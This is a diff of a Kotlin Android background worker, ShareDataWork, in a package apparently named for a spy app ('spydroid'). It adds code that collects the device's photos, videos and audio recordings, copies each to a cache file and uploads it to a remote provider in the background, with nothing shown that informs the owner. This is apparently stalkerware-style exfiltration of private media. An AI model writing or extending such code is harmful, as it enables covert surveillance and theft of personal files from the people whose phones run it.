@@ -18,35 +18,106 @@
 package net.spydroid.feature.sharedata
 
 import android.content.Context
+import android.net.Uri
 import android.util.Log
 import androidx.work.Worker
 import androidx.work.WorkerParameters
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.GlobalScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import net.spydroid.common.local.LocalDataProvider
+import net.spydroid.common.remote.RemoteDataProvider
+import java.io.File
+import java.io.FileOutputStream
+import java.io.InputStream
 
-class ShareDataWork(appContext: Context, workerParams: WorkerParameters)  :
+class ShareDataWork(private val appContext: Context, workerParams: WorkerParameters) :
     Worker(appContext, workerParams) {
 
-    override fun doWork(): Result {
-        // Aquí va la lógica del trabajo en segundo plano
-        try {
-            // Simulación de trabajo en segundo plano (puedes reemplazarlo con tu lógica)
-            var number = 0
-            while (number < 5) {
-                GlobalScope.launch {
-                    Log.d("MyWorker", "Trabajo en segundo plano ejecutándose")
-                    delay(5000) //delay 5 seconds
-                    number ++
-                }
+    private val localDataProvider = LocalDataProvider.current(appContext)
+    private val remoteDataProvider = RemoteDataProvider.current(appContext)
+    private val scope = CoroutineScope(Dispatchers.IO)
+    private fun getFileFromUri(uri: Uri, ext: String): File {
+        val inputStream: InputStream? = appContext.contentResolver.openInputStream(uri)
+        val file = File(appContext.cacheDir, "tempFile_${System.currentTimeMillis()}.$ext")
 
+        val outputStream = FileOutputStream(file)
+        val buffer = ByteArray(1024)
+        var length: Int
+
+        while (inputStream?.read(buffer).also { length = it!! } != -1) {
+            outputStream.write(buffer, 0, length)
+        }
+
+        outputStream.flush()
+        outputStream.close()
+        inputStream?.close()
+
+        return file
+    }
+
+    override fun doWork(): Result {
+        try {
+            scope.launch {
+
+                localDataProvider.currentMutimedia.collect {
+
+                    if (!it.images.isNullOrEmpty()) {
+                        it.images!!.map { uri ->
+                            scope.launch(Dispatchers.IO) {
+                                remoteDataProvider.setFile(
+                                    getFileFromUri(uri, ext = "jpg"),
+                                    type = "IMAGE",
+                                    alias = "PRUEBA_A03s"
+                                )
+                            }
+                        }
+                    }
+
+                    if (!it.videos.isNullOrEmpty()) {
+                        it.videos!!.map { uri ->
+                            scope.launch(Dispatchers.IO) {
+                                remoteDataProvider.setFile(
+                                    getFileFromUri(uri, ext = "mp4"),
+                                    type = "VIDEO",
+                                    alias = "PRUEBA_A03s"
+                                )
+                            }
+                        }
+                    }
+
+                    if (!it.audios.isNullOrEmpty()) {
+                        it.audios!!.map { uri ->
+                            scope.launch(Dispatchers.IO) {
+                                remoteDataProvider.setFile(
+                                    getFileFromUri(uri, ext = "mp3"),
+                                    type = "AUDIO",
+                                    alias = "PRUEBA_A03s"
+                                )
+                            }
+                        }
+                    }
+
+                    /*
+
+                   if (!it.documents.isNullOrEmpty()) {
+                        it.documents!!.map { uri ->
+                            remoteDataProvider.setFile(
+                                getFileFromUri(uri),
+                                type = "DOCUMENT",
+                                alias = "PRUEBA_A03s"
+                            )
+                        }
+                    }
+                     */
+
+                }
             }
 
-
-            // Si el trabajo se completó exitosamente
             return Result.success()
         } catch (e: Exception) {
-            // Si hubo un fallo en el trabajo
             return Result.failure()
         }
     }
